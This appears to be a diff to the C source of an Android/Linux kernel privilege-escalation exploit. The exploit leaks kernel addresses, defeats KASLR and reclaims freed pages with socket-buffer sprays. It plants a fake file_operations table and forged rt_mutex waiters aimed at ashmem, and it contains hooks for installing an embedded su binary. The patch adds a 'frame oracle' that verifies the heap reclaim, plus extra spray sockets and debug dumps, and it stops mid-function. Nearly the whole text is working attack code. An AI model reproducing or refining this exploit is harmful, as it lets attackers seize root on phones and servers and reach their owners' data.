@@ -1,5 +1,6 @@
 #include "common.h"
 #include "kernelsnitch/kernelsnitch.h"
+#include <poll.h>
 
 static void slide_report_exit(const char *which, int status) {
   char buf[96];
@@ -71,8 +72,18 @@ void _exit(int status) {
 static struct kernelsnitch_shared_state *ks;
 static size_t mm_objs_per_slab;
 static unsigned char *skb_buf;
-static int reclaim_sv[2] = {-1, -1};
+static int reclaim_sv[SKB_RECLAIM_SENDS][2] = {
+    {-1, -1},
+    {-1, -1},
+    {-1, -1},
+    {-1, -1},
+};
+_Static_assert(SKB_RECLAIM_SENDS == 4, "reclaim_sv initializer count");
 static int g_payload_peek_fd = -1;
+#define FRAME_ORACLE_SPRAY_MAX 4
+static unsigned char *frame_oracle_spray[FRAME_ORACLE_SPRAY_MAX];
+static size_t frame_oracle_spray_len[FRAME_ORACLE_SPRAY_MAX];
+static int frame_oracle_spray_n;
 static struct mm_ctx prepare_ctx;
 static struct mm_ctx spray_ctx;
 static struct mm_ctx pre_ctx;
@@ -90,23 +101,47 @@ uintptr_t fake_fops;
 uintptr_t binwrite_target;
 char ashmem_path[256] = "/dev/ashmem";
 
+static long gl_cpu_count_onln = -1;
+static char gl_cpu_online_txt[64] = "unreadable";
+
+void gl_pre_cache_cpuinfo(void) {
+  char txt[64] = "unreadable";
+  long n;
+  if (gl_cpu_count_onln > 0) {
+    return;
+  }
+  read_first_line("/sys/devices/system/cpu/online", txt, sizeof(txt));
+  n = sysconf(_SC_NPROCESSORS_ONLN);
+  if (n < 1) {
+    n = 1;
+  }
+  memcpy(gl_cpu_online_txt, txt, sizeof(gl_cpu_online_txt));
+  gl_cpu_count_onln = n;
+  pr_info("v141 cpu pre-cache onln=%ld online=%s\n", n, gl_cpu_online_txt);
+}
+
+long gl_get_cpu_count(void) {
+  long n = gl_cpu_count_onln;
+  if (n > 0) {
+    return n;
+  }
+  n = sysconf(_SC_NPROCESSORS_ONLN);
+  return n < 1 ? 1 : n;
+}
+
 void setup_kernelsnitch(void) {
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+  int cpu_count = (int)gl_get_cpu_count();
+  ks = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+                          0, 0);
 }
 
 int kernelsnitch_collisions_ready(void) {
   return kernelsnitch_found_collisions(ks);
 }
 
-void run_kernelsnitch_bruteforce(void) {
-  kernelsnitch_bruteforce(ks);
-}
+void run_kernelsnitch_bruteforce(void) { kernelsnitch_bruteforce(ks); }
 
-uintptr_t current_kernelsnitch_mm_struct(void) {
-  return ks->mm_struct;
-}
+uintptr_t current_kernelsnitch_mm_struct(void) { return ks->mm_struct; }
 
 uintptr_t cleanup_kernelsnitch(void) {
   uintptr_t leaked = kernelsnitch_cleanup(ks);
@@ -114,17 +149,10 @@ uintptr_t cleanup_kernelsnitch(void) {
   return leaked;
 }
 
-__attribute__((weak))
-int install_embedded_su(pid_t *daemon_pid) {
+__attribute__((weak)) int install_embedded_su(pid_t *daemon_pid) {
   if (daemon_pid) {
     *daemon_pid = -1;
   }
-  errno = ENOSYS;
-  return 0;
-}
-
-__attribute__((weak))
-int install_embedded_wallpaper(void) {
   errno = ENOSYS;
   return 0;
 }
@@ -180,16 +208,18 @@ void log_startup_context(void) {
           values[i][len] = 0;
         }
       }
-      snprintf(limits, sizeof(limits), "NoNewPrivs=%s Seccomp=%s "
-               "Seccomp_filters=%s", values[0], values[1], values[2]);
+      snprintf(limits, sizeof(limits),
+               "NoNewPrivs=%s Seccomp=%s "
+               "Seccomp_filters=%s",
+               values[0], values[1], values[2]);
     }
   }
-  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s enforce=%s\n",
-             getpid(), getuid(), geteuid(), getgid(), getegid(), attr,
-             enforce);
+  pr_success("startup context pid=%d uid=%u euid=%u gid=%u egid=%u attr=%s "
+             "enforce=%s\n",
+             getpid(), getuid(), geteuid(), getgid(), getegid(), attr, enforce);
   pr_success("startup limits pid=%d %s\n", getpid(), limits);
-  pr_success("build config pid=%d label=%s slide=pselect main=pselect\n",
-             getpid(), BUILD_VARIANT_LABEL);
+  pr_success("build config pid=%d version=%s label=%s slide=pselect main=pselect\n",
+             getpid(), BUILD_VERSION, BUILD_VARIANT_LABEL);
   pr_success("p0 profile pid=%d phys_offset=%016llx kernel_phys_load=%016llx "
              "delta=%016llx slide_logger=%016llx bootid_data=%016llx "
              "init_task=%016llx root_tg=%016llx sysctl_bootid=%016llx\n",
@@ -214,13 +244,10 @@ void log_slide_child_context(void) {
              attr, enforce);
 }
 
-void disable_rseq_for_thread(void) {
-  return;
-}
+void disable_rseq_for_thread(void) { return; }
 
 long futex_op(uint32_t *uaddr, int op, uint32_t val,
-              const struct timespec *timeout, uint32_t *uaddr2,
-              uint32_t val3) {
+              const struct timespec *timeout, uint32_t *uaddr2, uint32_t val3) {
   return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
 }
 
@@ -284,8 +311,7 @@ void init_ashmem_path(void) {
 
       char path[256];
       snprintf(path, sizeof(path), "/dev/%s", de->d_name);
-      if (same_rdev_path(path, base.st_rdev) &&
-          try_cache_ashmem_path(path)) {
+      if (same_rdev_path(path, base.st_rdev) && try_cache_ashmem_path(path)) {
         closedir(dir);
         return;
       }
@@ -296,7 +322,31 @@ void init_ashmem_path(void) {
   }
 }
 
+static volatile int g_fops_armed;
+
+void util_mark_fops_armed(const char *why) {
+  if (g_fops_armed) {
+    return;
+  }
+  g_fops_armed = 1;
+  pr_warning("v113 slot-armed: %s -> every later ashmem open is gated by "
+             "the frame oracle\n",
+             why ? why : "-");
+}
+
+int util_fops_armed(void) { return g_fops_armed; }
+
 int open_ashmem_device(void) {
+  if (g_fops_armed && env_flag("SLIDE_FRAME_GUARD_ORACLE", 1)) {
+    int owned = util_frame_oracle("open-gate");
+    if (owned != 1) {
+      pr_warning("v113 open-gate: oracle=%d -> refuse openat(%s) "
+                 "(slot armed with an unproven frame)\n",
+                 owned, ashmem_path);
+      errno = EPERM;
+      return -1;
+    }
+  }
   return SYSCHK(open(ashmem_path, O_RDWR | O_CLOEXEC));
 }
 
@@ -319,9 +369,7 @@ uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
   return (data_alias - P0_PAGE_OFFSET) - P0_KERNEL_PHYS_DELTA;
 }
 
-uintptr_t data_addr(uintptr_t image_addr) {
-  return p0_data_alias(image_addr);
-}
+uintptr_t data_addr(uintptr_t image_addr) { return p0_data_alias(image_addr); }
 
 uintptr_t kaslr_image_addr(uintptr_t image_addr) {
   if (!kaslr_done) {
@@ -338,9 +386,7 @@ uintptr_t slide_canon_addr(uintptr_t data_alias) {
   return kaslr_base + p0_alias_image_offset(data_alias);
 }
 
-uintptr_t canon_addr(uintptr_t image_addr) {
-  return text_addr(image_addr);
-}
+uintptr_t canon_addr(uintptr_t image_addr) { return text_addr(image_addr); }
 
 void put64(unsigned char *p, size_t off, uint64_t value) {
   memcpy(p + off, &value, sizeof(value));
@@ -352,8 +398,7 @@ void put32(unsigned char *p, size_t off, uint32_t value) {
 
 void put_fake_fops_table(unsigned char *p, size_t off) {
   put64(p, off + FOPS_OWNER_OFF, 0);
-  put64(p, off + FOPS_LLSEEK_OFF,
-        fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
+  put64(p, off + FOPS_LLSEEK_OFF, fake_w0 + FAKE_WAITER_PI_TREE_ENTRY_OFF);
   put64(p, off + FOPS_READ_OFF, 0);
   put64(p, off + FOPS_WRITE_OFF, 0);
   put64(p, off + FOPS_READ_ITER_OFF, text_addr(CONFIGFS_READ_ITER));
@@ -395,8 +440,7 @@ int try_set_ashmem_name_blob(int fd, const unsigned char *blob, size_t len) {
   }
 
   for (size_t i = len; i > 0; i--) {
-    if (blob[i - 1] == 0 &&
-        try_put_blob_zero_at(fd, blob, i - 1) != 0) {
+    if (blob[i - 1] == 0 && try_put_blob_zero_at(fd, blob, i - 1) != 0) {
       return -1;
     }
   }
@@ -442,10 +486,12 @@ void kill_child(pid_t child) {
 }
 
 void close_reclaim_sockets(void) {
-  for (int i = 0; i < 2; i++) {
-    if (reclaim_sv[i] >= 0) {
-      close(reclaim_sv[i]);
-      reclaim_sv[i] = -1;
+  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+    for (int j = 0; j < 2; j++) {
+      if (reclaim_sv[i][j] >= 0) {
+        close(reclaim_sv[i][j]);
+        reclaim_sv[i][j] = -1;
+      }
     }
   }
 }
@@ -611,6 +657,73 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   return 1;
 }
 
+static int v116_canary_go[2] = {-1, -1};
+static int v116_canary_done[2] = {-1, -1};
+static pthread_t v116_canary_thread;
+static int v116_canary_thread_started;
+static int v116_canary_desync;
+
+static void *v116_i1_canary_thread(void *arg) {
+  (void)arg;
+  pin_to_core(CORE);
+  unsigned char *cbuf = malloc(SKB_SEND_SIZE);
+  static const unsigned char v116_canary_nonce[8] = {0x11, 0x66, 0x11, 0x66,
+                                                     0x11, 0x66, 0x11, 0x66};
+  if (cbuf) {
+    memset(cbuf, 0, SKB_SEND_SIZE);
+  }
+  for (;;) {
+    char go = 0;
+    if (read(v116_canary_go[0], &go, 1) != 1) {
+      break;
+    }
+    int sv[2] = {-1, -1};
+    int ready = 0;
+    if (cbuf && socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
+      int sndbuf = 1 << 20;
+      setsockopt(sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+      int fl = fcntl(sv[0], F_GETFL, 0);
+      if (fl >= 0) {
+        fcntl(sv[0], F_SETFL, fl | O_NONBLOCK);
+      }
+      memcpy(cbuf, skb_buf, SKB_SEND_SIZE);
+      memcpy(cbuf, v116_canary_nonce, sizeof(v116_canary_nonce));
+      ready = 1;
+    }
+    if (!ready) {
+      pr_warning("v116 I1 canary setup failed buf=%p sv=%d,%d\n", cbuf, sv[0],
+                 sv[1]);
+    } else {
+      struct iovec ciov;
+      struct msghdr cmsg;
+      unsigned char peek64[64];
+      memset(&ciov, 0, sizeof(ciov));
+      memset(&cmsg, 0, sizeof(cmsg));
+      memset(peek64, 0, sizeof(peek64));
+      ciov.iov_base = cbuf;
+      ciov.iov_len = SKB_SEND_SIZE;
+      cmsg.msg_iov = &ciov;
+      cmsg.msg_iovlen = 1;
+      errno = 0;
+      (void)sendmsg(sv[0], &cmsg, MSG_DONTWAIT);
+      errno = 0;
+      (void)recv(sv[1], peek64, sizeof(peek64), MSG_PEEK | MSG_DONTWAIT);
+    }
+    if (sv[0] >= 0) {
+      close(sv[0]);
+    }
+    if (sv[1] >= 0) {
+      close(sv[1]);
+    }
+    char done = 1;
+    if (write(v116_canary_done[1], &done, 1) != 1) {
+      break;
+    }
+  }
+  free(cbuf);
+  return NULL;
+}
+
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
@@ -629,9 +742,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
   }
 
-  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
-  ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+  int cpu_count = (int)gl_get_cpu_count();
+  ks = kernelsnitch_setup(MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+                          0, 0);
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -647,6 +760,22 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
   SYSCHK(close(warm_sv[0]));
   SYSCHK(close(warm_sv[1]));
+  if (!v116_canary_thread_started && env_flag("SLIDE_V116_I1", 1)) {
+    if (pipe(v116_canary_go) == 0 && pipe(v116_canary_done) == 0) {
+      pthread_attr_t cattr;
+      pthread_attr_init(&cattr);
+      pthread_attr_setstacksize(&cattr, 65536);
+      if (pthread_create(&v116_canary_thread, &cattr, v116_i1_canary_thread,
+                         NULL) == 0) {
+        v116_canary_thread_started = 1;
+      } else {
+        pr_warning("v116 I1 canary pthread_create failed\n");
+      }
+      pthread_attr_destroy(&cattr);
+    } else {
+      pr_warning("v116 I1 canary pipes failed errno=%d\n", errno);
+    }
+  }
   child_leak = clone_leak_child();
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
     post_ctx.childs[i] = clone_child();
@@ -706,12 +835,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
-  SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
   int sndbuf = 1 << 20;
-  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
-  int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
-  if (reclaim_flags >= 0) {
-    fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
+  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+    SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv[i]));
+    setsockopt(reclaim_sv[i][0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
+               sizeof(sndbuf));
+    int reclaim_flags = fcntl(reclaim_sv[i][0], F_GETFL, 0);
+    if (reclaim_flags >= 0) {
+      fcntl(reclaim_sv[i][0], F_SETFL, reclaim_flags | O_NONBLOCK);
+    }
   }
   int pcp_shaping_sv[2];
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, pcp_shaping_sv));
@@ -725,8 +857,30 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   memset(&msg, 0, sizeof(msg));
   msg.msg_iov = &iov;
   msg.msg_iovlen = 1;
+  if (v116_canary_thread_started && !v116_canary_desync &&
+      env_flag("SLIDE_V116_I1", 1)) {
+    char go = 1;
+    if (write(v116_canary_go[1], &go, 1) == 1) {
+      struct pollfd pfd;
+      memset(&pfd, 0, sizeof(pfd));
+      pfd.fd = v116_canary_done[0];
+      pfd.events = POLLIN;
+      int pr = poll(&pfd, 1, 2000);
+      char done;
+      if (pr == 1 && read(v116_canary_done[0], &done, 1) == 1) {
+      } else {
+        v116_canary_desync = 1;
+        pr_warning("v116 I1 canary handshake timeout pr=%d errno=%d\n", pr,
+                   errno);
+      }
+    } else {
+      v116_canary_desync = 1;
+      pr_warning("v116 I1 canary go write failed errno=%d\n", errno);
+    }
+  }
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
+  pr_info("v115 P1 capture send cpu=%d\n", sched_getcpu());
   pin_to_core(CORE);
   sched_yield();
   sched_yield();
@@ -746,8 +900,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   SYSCHK(close(pcp_shaping_sv[0]));
-  int hold_skb = env_flag("PAGE_HOLD_SKB", 0) ||
-                 env_flag("SLIDE_PAGE_HOLD_SKB", 0);
+  int hold_skb =
+      env_flag("PAGE_HOLD_SKB", 0) || env_flag("SLIDE_PAGE_HOLD_SKB", 0);
   if (hold_skb) {
     g_payload_peek_fd = pcp_shaping_sv[1];
   } else {
@@ -760,11 +914,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
-    errno = 0;
-    ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
-    if (sent <= 0) {
-      break;
-    }
+    sendmsg(reclaim_sv[i][0], &msg, MSG_DONTWAIT);
   }
   kernelsnitch_cleanup(ks);
   ks = NULL;
@@ -788,12 +938,14 @@ uintptr_t prepare_good_kernel_page(int payload_mode) {
   for (int attempt = 1; attempt <= max_attempts; attempt++) {
     uintptr_t base = prepare_kernel_page(payload_mode);
     if (base) {
+      pr_info("v116 V6 base=0x%016llx attempt=%d/%d\n",
+              (unsigned long long)base, attempt, max_attempts);
       return base;
     }
-    pr_warning("prepare_kernel_page retry %d/%d\n", attempt,
-               max_attempts);
+    pr_warning("prepare_kernel_page retry %d/%d\n", attempt, max_attempts);
   }
-  pr_warning("prepare_kernel_page did not find usable nonzero source pointers\n");
+  pr_warning(
+      "prepare_kernel_page did not find usable nonzero source pointers\n");
   return 0;
 }
 
@@ -814,12 +966,17 @@ void util_reclaim_payload_spray(void) {
   for (size_t off = 0; off < region; off += PAGE_SIZE) {
     memcpy(m + off, tpl, sizeof(tpl));
   }
+  if (frame_oracle_spray_n < FRAME_ORACLE_SPRAY_MAX) {
+    frame_oracle_spray[frame_oracle_spray_n] = m;
+    frame_oracle_spray_len[frame_oracle_spray_n] = region;
+    frame_oracle_spray_n++;
+  }
   pr_info("slide reclaim spray region=%zu frame_off=0x%lx tbl=0x100 pinned\n",
           region, (unsigned long)frame_off);
 }
 
 int util_frame_regrab_burst(void) {
-  if (reclaim_sv[0] < 0 || !skb_buf) {
+  if (reclaim_sv[0][0] < 0 || !skb_buf) {
     return 0;
   }
   struct iovec iov;
@@ -832,14 +989,458 @@ int util_frame_regrab_burst(void) {
   msg.msg_iovlen = 1;
   int sent = 0;
   for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+    if (reclaim_sv[i][0] < 0) {
+      continue;
+    }
     errno = 0;
-    ssize_t s = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
+    ssize_t s = sendmsg(reclaim_sv[i][0], &msg, MSG_DONTWAIT);
     if (s <= 0) {
-      break;
+      continue;
     }
     sent++;
   }
   return sent;
+}
+
+int util_frame_oracle_marker(const char *tag, uint64_t marker,
+                             size_t marker_off) {
+  const size_t frame_off = (size_t)(FOPS_TABLE_OFF + SKB_DATA_DELTA);
+  const size_t payload_off = marker_off + (size_t)(-SKB_DATA_DELTA);
+  const int have_marker = marker != 0;
+  int srcA = -1;
+  int srcB = -1;
+  long mkA = 0;
+  long mkB = 0;
+  long diffA = 0;
+  long diffB = 0;
+  long scannedA = 0;
+  long scannedB = 0;
+
+  if (skb_buf && frame_off + 0x100 <= PAGE_SIZE &&
+      marker_off + sizeof(uint64_t) <= PAGE_SIZE) {
+    unsigned char tpl[PAGE_SIZE];
+    memset(tpl, 0, sizeof(tpl));
+    memcpy(tpl + frame_off, skb_buf + FOPS_TABLE_OFF, 0x100);
+    uint64_t tpl_marker = 0;
+    memcpy(&tpl_marker, tpl + marker_off, sizeof(tpl_marker));
+    for (int s = 0; s < frame_oracle_spray_n; s++) {
+      unsigned char *m = frame_oracle_spray[s];
+      size_t len = frame_oracle_spray_len[s];
+      for (size_t off = 0; off + PAGE_SIZE <= len; off += PAGE_SIZE) {
+        unsigned char *p = m + off;
+        uint64_t v = 0;
+        memcpy(&v, p + marker_off, sizeof(v));
+        scannedA++;
+        if (have_marker && v == marker && marker != tpl_marker) {
+          mkA++;
+          continue;
+        }
+        if (memcmp(p, tpl, PAGE_SIZE) != 0) {
+          diffA++;
+        }
+      }
+    }
+    srcA = mkA > 0 ? 1 : (scannedA > 0 ? 0 : -1);
+  }
+
+  uint64_t tpl_marker_b = 0;
+  if (skb_buf && payload_off + sizeof(tpl_marker_b) <= SKB_SEND_SIZE) {
+    memcpy(&tpl_marker_b, skb_buf + payload_off, sizeof(tpl_marker_b));
+  }
+  int fds[1 + SKB_RECLAIM_SENDS];
+  int nfds = 0;
+  fds[nfds++] = g_payload_peek_fd;
+  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+    fds[nfds++] = reclaim_sv[i][1];
+  }
+  for (int k = 0; k < nfds; k++) {
+    if (fds[k] < 0) {
+      continue;
+    }
+    static unsigned char peekbuf[0x2400];
+    ssize_t rd =
+        recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
+    if (rd <= 0) {
+      continue;
+    }
+    scannedB++;
+    uint64_t v = 0;
+    if ((size_t)rd >= payload_off + sizeof(v)) {
+      memcpy(&v, peekbuf + payload_off, sizeof(v));
+    }
+    if (have_marker && v == marker && marker != tpl_marker_b) {
+      mkB++;
+      continue;
+    }
+    if (skb_buf && memcmp(peekbuf, skb_buf, (size_t)rd) != 0) {
+      diffB++;
+    }
+  }
+  srcB = mkB > 0 ? 1 : (scannedB > 0 ? 0 : -1);
+
+  int owned = (mkA > 0 || mkB > 0) ? 1 : ((srcA == 0 || srcB == 0) ? 0 : -1);
+  pr_info("v113 frame-oracle owned=%d srcA=%d srcB=%d hits=%ld "
+          "scanned=%ld base=%p tag=%s mkA=%ld mkB=%ld diffA=%ld diffB=%ld "
+          "marker=%016llx moff=0x%zx\n",
+          owned, srcA, srcB, mkA + mkB, scannedA + scannedB, (void *)page_base,
+          tag ? tag : "-", mkA, mkB, diffA, diffB, (unsigned long long)marker,
+          marker_off);
+  return owned;
+}
+
+int util_frame_oracle(const char *tag) {
+#ifdef ASHMEM_MISC_FOPS_SLOT
+  return util_frame_oracle_marker(tag, (uint64_t)ASHMEM_MISC_FOPS_SLOT,
+                                  (size_t)ARM_MARK_OFF);
+#else
+  return util_frame_oracle_marker(tag, 0, (size_t)ARM_MARK_OFF);
+#endif
+}
+
+void util_v121e_mark_readback(const char *when) {
+  const size_t frame_offs[4] = {
+      (size_t)(FOPS_TABLE_OFF + SKB_DATA_DELTA),
+      (size_t)ARM_MARK_OFF,
+      (size_t)(ARM_MARK_OFF + 8),
+      (size_t)PROBE_MARK_OFF,
+  };
+  const size_t delta = (size_t)(-SKB_DATA_DELTA);
+  uint64_t tpl[4] = {0, 0, 0, 0};
+  if (skb_buf) {
+    for (int i = 0; i < 4; i++) {
+      size_t po = frame_offs[i] + delta;
+      if (po + sizeof(uint64_t) <= (size_t)SKB_SEND_SIZE) {
+        memcpy(&tpl[i], skb_buf + po, sizeof(uint64_t));
+      }
+    }
+  }
+  int fds[1 + SKB_RECLAIM_SENDS];
+  int nfds = 0;
+  fds[nfds++] = g_payload_peek_fd;
+  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+    fds[nfds++] = reclaim_sv[i][1];
+  }
+  for (int k = 0; k < nfds; k++) {
+    if (fds[k] < 0) {
+      continue;
+    }
+    static unsigned char peekbuf[0x2400];
+    ssize_t rd =
+        recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
+    if (rd <= 0) {
+      continue;
+    }
+    uint64_t v[4] = {0, 0, 0, 0};
+    int okv[4] = {0, 0, 0, 0};
+    for (int i = 0; i < 4; i++) {
+      size_t po = frame_offs[i] + delta;
+      if (po + sizeof(uint64_t) <= (size_t)rd) {
+        memcpy(&v[i], peekbuf + po, sizeof(uint64_t));
+        okv[i] = 1;
+      }
+    }
+    int chg = skb_buf ? (memcmp(peekbuf, skb_buf, (size_t)rd) != 0) : -1;
+    pr_warning("v121e arm mark readback when=%s fd=%d rd=%zd "
+               "f180=%016llx f188=%016llx f190=%016llx f300=%016llx "
+               "t188=%016llx chg=%d ok=%d%d%d%d\n",
+               when ? when : "-", fds[k], rd, (unsigned long long)v[0],
+               (unsigned long long)v[1], (unsigned long long)v[2],
+               (unsigned long long)v[3], (unsigned long long)tpl[1], chg,
+               okv[0], okv[1], okv[2], okv[3]);
+  }
+}
+
+int util_v129_prego_gate(int probe_fd, uint64_t glk, const char *when) {
+  const size_t frame_offs[4] = {
+      (size_t)(FOPS_TABLE_OFF + SKB_DATA_DELTA),
+      (size_t)ARM_MARK_OFF,
+      (size_t)(ARM_MARK_OFF + 8),
+      (size_t)PROBE_MARK_OFF,
+  };
+  const size_t delta = (size_t)(-SKB_DATA_DELTA);
+  int pass = 1;
+  int nfds = 0;
+  int fds[1 + SKB_RECLAIM_SENDS];
+  fds[nfds++] = g_payload_peek_fd;
+  for (int i = 0; i < SKB_RECLAIM_SENDS; i++) {
+    fds[nfds++] = reclaim_sv[i][1];
+  }
+  static unsigned char peekbuf[0x2400];
+  for (int k = 0; k < nfds; k++) {
+    if (fds[k] < 0) {
+      continue;
+    }
+    ssize_t rd =
+        recv(fds[k], peekbuf, sizeof(peekbuf), MSG_PEEK | MSG_DONTWAIT);
+    if (rd <= 0) {
+      continue;
+    }
+    uint64_t tpl188 = 0;
+    if (skb_buf) {
+      size_t po = frame_offs[1] + delta;
+      if (po + sizeof(uint64_t) <= (size_t)SKB_SEND_SIZE) {
+        memcpy(&tpl188, skb_buf + po, sizeof(uint64_t));
+      }
+    }
+    uint64_t f188 = 0, f300 = 0;
+    int ok188 = 0, ok300 = 0;
+    for (int i = 0; i < 4; i++) {
+      size_t po = frame_offs[i] + delta;
+      if (po + sizeof(uint64_t) <= (size_t)rd) {
+        if (i == 1) {
+          memcpy(&f188, peekbuf + po, sizeof(uint64_t));
+          ok188 = 1;
+        } else if (i == 3) {
+          memcpy(&f300, peekbuf + po, sizeof(uint64_t));
+          ok300 = 1;
+        }
+      }
+    }
+    int fd_ok = 1;
+    if (ok188 && tpl188 != 0 && f188 != tpl188) {
+      fd_ok = 0;
+    }
+    if (ok300 && f300 != 0) {
+      fd_ok = 0;
+    }
+    if (!fd_ok) {
+      pass = 0;
+    }
+    pr_warning("v129 prego-gate when=%s fd=%d rd=%zd f188=%016llx "
+               "t188=%016llx f300=%016llx fd_ok=%d\n",
+               when ? when : "-", fds[k], rd, (unsigned long long)f188,
+               (unsigned long long)tpl188, (unsigned long long)f300, fd_ok);
+  }
+  unsigned char lb[32];
+  memset(lb, 0, sizeof(lb));
+  ssize_t lrd = configfs_read_once(probe_fd, glk, lb, sizeof(lb));
+  uint64_t wl = 0, root = 0, lmost = 0, owner = 0;
+  if (lrd == (ssize_t)sizeof(lb)) {
+    memcpy(&wl, lb + 0x00, 8);
+    memcpy(&root, lb + 0x08, 8);
+    memcpy(&lmost, lb + 0x10, 8);
+    memcpy(&owner, lb + 0x18, 8);
+    if (wl != 0 || root != 0 || lmost != 0 || owner != 0) {
+      pass = 0;
+    }
+  } else {
+    pass = 0;
+  }
+  pr_warning("v129 prego-gate when=%s glk=%016llx lrd=%zd wait_lock=%016llx "
+             "rb_root=%016llx rb_leftmost=%016llx owner=%016llx verdict=%s\n",
+             when ? when : "-", (unsigned long long)glk, lrd,
+             (unsigned long long)wl, (unsigned long long)root,
+             (unsigned long long)lmost, (unsigned long long)owner,
+             pass ? "PASS" : "REJECT");
+  return pass ? 0 : -1;
+}
+
+#define V122_W_FRAME_OFF ((size_t)(W0_OFF + (long)SKB_DATA_DELTA))
+_Static_assert(W0_OFF + (long)SKB_DATA_DELTA == 0x13a0,
+               "v122 W band frame offset");
+_Static_assert(V122_W_FRAME_OFF + FAKE_WAITER_DEADLINE_OFF + sizeof(uint64_t) <=
+                   2 * (size_t)PAGE_SIZE,
+               "v122 W band must fit the two-page mirror template");
+
+void util_frame_band_dump(const char *tag) {
+  static int on = -1;
+  if (on < 0) {
+    on = env_flag("SLIDE_W_BAND_DUMP", 0);
+  }
+  if (!on) {
+    return;
+  }
+  static const size_t band[9] = {
+      V122_W_FRAME_OFF + WAITER_TREE_ENTRY_OFF + 0x00,
+      V122_W_FRAME_OFF + WAITER_TREE_ENTRY_OFF + 0x08,
+      V122_W_FRAME_OFF + WAITER_TREE_ENTRY_OFF + 0x10,
+      V122_W_FRAME_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF,
+      V122_W_FRAME_OFF + FAKE_WAITER_TASK_OFF,
+      V122_W_FRAME_OFF + FAKE_WAITER_LOCK_OFF,
+      V122_W_FRAME_OFF + FAKE_WAITER_WAKE_STATE_OFF,
+      V122_W_FRAME_OFF + FAKE_WAITER_PRIO_OFF,
+      V122_W_FRAME_OFF + FAKE_WAITER_DEADLINE_OFF,
+  };
+  const size_t band_hi = band[8];
+  const size_t delta = (size_t)(-SKB_DATA_DELTA);
+  const size_t stream_off = band[0] + delta;
+
+  if (frame_oracle_spray_n > 0 && skb_buf) {
+    unsigned char tpl[2 * PAGE_SIZE];
+    const size_t frame_off = (size_t)(FOPS_TABLE_OFF + SKB_DATA_DELTA);
+    memset(tpl, 0, sizeof(tpl));
+    if (frame_off + 0x100 <= PAGE_SIZE) {
+      memcpy(tpl + frame_off, skb_buf + FOPS_TABLE_OFF, 0x100);
+      memcpy(tpl + PAGE_SIZE + frame_off, skb_buf + FOPS_TABLE_OFF, 0x100);
+    }
+    uint64_t w0[9] = {0};
+    uint64_t wd[9] = {0};
+    int n = 0;
+    int nd = -1;
+    for (int s = 0; s < frame_oracle_spray_n; s++) {
+      unsigned char *m = frame_oracle_spray[s];
+      size_t len = frame_oracle_spray_len[s];
+      for (size_t off = 0; off + PAGE_SIZE <= len; off += PAGE_SIZE) {
+        unsigned char *p = m + off;
+        uint64_t v[9];
+        int dev = 0;
+        if (off + band_hi + sizeof(uint64_t) > len) {
+          continue;
+        }
+        for (int i = 0; i < 9; i++) {
+          uint64_t t = 0;
+          memcpy(&v[i], p + band[i], sizeof(uint64_t));
+          memcpy(&t, tpl + band[i], sizeof(t));
+          if (v[i] != t) {
+            dev = 1;
+          }
+        }
+        if (n == 0) {
+          memcpy(w0, v, sizeof(w0));
+        }
+        if (dev && nd < 0) {
+          nd = n;
+          memcpy(wd, v, sizeof(wd));
+        }
+        n++;
+      }
+    }
+    if (n > 0) {
+      const uint64_t *w = nd >= 0 ? wd : w0;
+      pr_warning("v122 W-band tag=%s src=A idx=%d n=%d off=0x%zx "
+                 "w=[%016llx %016llx %016llx %016llx %016llx %016llx "
+                 "%016llx %016llx %016llx]\n",
